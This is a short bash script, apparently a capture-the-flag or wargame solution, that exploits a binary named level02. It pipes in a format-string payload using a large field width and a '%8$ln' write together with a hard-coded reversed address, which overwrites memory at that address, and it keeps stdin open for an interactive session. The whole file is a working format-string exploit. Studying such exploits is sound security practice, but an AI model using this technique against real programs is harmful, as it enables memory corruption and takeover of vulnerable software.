#!/bin/bash
cat <(python -c "print('%4196972d%8\$ln')") <(python -c "print('\x00\x00\x00\x00\x00\x60\x11\xe0'[::-1])") - | ./level02
